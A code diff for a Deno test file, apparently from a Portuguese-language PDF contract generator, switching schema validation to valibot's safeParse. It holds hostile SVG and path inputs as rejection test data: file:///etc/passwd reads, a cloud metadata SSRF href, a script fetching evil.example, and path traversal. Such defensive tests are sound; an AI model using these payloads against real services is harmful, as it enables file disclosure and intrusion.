@@ -1,4 +1,5 @@
 import { assertEquals } from "@std/assert";
+import * as v from "valibot";
 import { AnticipationContractDataSchema, PdfOptionsSchema } from "@/generator/dto/generate-document.job.ts";
 
 const VALID_QRCODE_SVG =
@@ -38,14 +39,14 @@ const VALID_ANTICIPATION_CONTRACT_DATA = {
 // --- qrcode_pf / qrcode_pj ---
 
 Deno.test("AnticipationContractDataSchema: aceita SVG de QR code válido", () => {
-	const result = AnticipationContractDataSchema.safeParse(VALID_ANTICIPATION_CONTRACT_DATA);
+	const result = v.safeParse(AnticipationContractDataSchema, VALID_ANTICIPATION_CONTRACT_DATA);
 	assertEquals(result.success, true);
 });
 
 Deno.test("AnticipationContractDataSchema: rejeita qrcode com foreignObject (local-file-read)", () => {
 	const malicious =
 		`<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><img src="file:///etc/passwd"/></foreignObject></svg>`;
-	const result = AnticipationContractDataSchema.safeParse({
+	const result = v.safeParse(AnticipationContractDataSchema, {
 		...VALID_ANTICIPATION_CONTRACT_DATA,
 		qrcode_pf: malicious,
 	});
@@ -55,7 +56,7 @@ Deno.test("AnticipationContractDataSchema: rejeita qrcode com foreignObject (loc
 Deno.test("AnticipationContractDataSchema: rejeita qrcode com href externo (SSRF via metadata endpoint)", () => {
 	const malicious =
 		`<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>`;
-	const result = AnticipationContractDataSchema.safeParse({
+	const result = v.safeParse(AnticipationContractDataSchema, {
 		...VALID_ANTICIPATION_CONTRACT_DATA,
 		qrcode_pj: malicious,
 	});
@@ -64,7 +65,7 @@ Deno.test("AnticipationContractDataSchema: rejeita qrcode com href externo (SSRF
 
 Deno.test("AnticipationContractDataSchema: rejeita qrcode com <script>", () => {
 	const malicious = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('http://evil.example')</script></svg>`;
-	const result = AnticipationContractDataSchema.safeParse({
+	const result = v.safeParse(AnticipationContractDataSchema, {
 		...VALID_ANTICIPATION_CONTRACT_DATA,
 		qrcode_pf: malicious,
 	});
@@ -72,7 +73,7 @@ Deno.test("AnticipationContractDataSchema: rejeita qrcode com <script>", () => {
 });
 
 Deno.test("AnticipationContractDataSchema: rejeita qrcode que não é um SVG válido", () => {
-	const result = AnticipationContractDataSchema.safeParse({
+	const result = v.safeParse(AnticipationContractDataSchema, {
 		...VALID_ANTICIPATION_CONTRACT_DATA,
 		qrcode_pf: "<div>não é svg</div>",
 	});
@@ -83,17 +84,17 @@ Deno.test("AnticipationContractDataSchema: rejeita qrcode que não é um SVG vá
 
 Deno.test("PdfOptionsSchema: aceita caminho de fonte dentro do diretório de assets permitido", () => {
 	const allowedPath = new URL("../../../../fonts/Roboto-VariableFont.ttf", import.meta.url).pathname;
-	const result = PdfOptionsSchema.safeParse({ fonts: [allowedPath] });
+	const result = v.safeParse(PdfOptionsSchema, { fonts: [allowedPath] });
 	assertEquals(result.success, true);
 });
 
 Deno.test("PdfOptionsSchema: rejeita caminho de fonte fora do diretório de assets permitido (local-file-read)", () => {
-	const result = PdfOptionsSchema.safeParse({ fonts: ["/etc/passwd"] });
+	const result = v.safeParse(PdfOptionsSchema, { fonts: ["/etc/passwd"] });
 	assertEquals(result.success, false);
 });
 
 Deno.test("PdfOptionsSchema: rejeita caminho de css com path traversal", () => {
 	const allowedDir = new URL("../../../../fonts/", import.meta.url).pathname;
-	const result = PdfOptionsSchema.safeParse({ css: [`${allowedDir}../../etc/passwd`] });
+	const result = v.safeParse(PdfOptionsSchema, { css: [`${allowedDir}../../etc/passwd`] });
 	assertEquals(result.success, false);
 });
